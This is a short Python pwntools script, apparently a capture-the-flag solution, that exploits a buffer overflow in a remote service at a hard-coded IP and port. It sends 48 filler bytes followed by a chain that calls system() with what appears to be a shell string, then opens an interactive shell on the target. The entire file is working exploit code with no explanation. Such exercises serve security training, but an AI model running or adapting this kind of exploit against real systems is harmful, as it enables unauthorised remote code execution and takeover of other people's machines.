#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
#r = process('/tmp/p/a')
r = remote('89.38.210.128', 31337)
trash = 'a'*48
r.sendlineafter('> ', str(31337))
r.recvrepeat(0.2)
sh = 0x8048b25
system_plt = 0x80484f0

r.sendline(trash + flat([system_plt, sh, sh]))

r.interactive()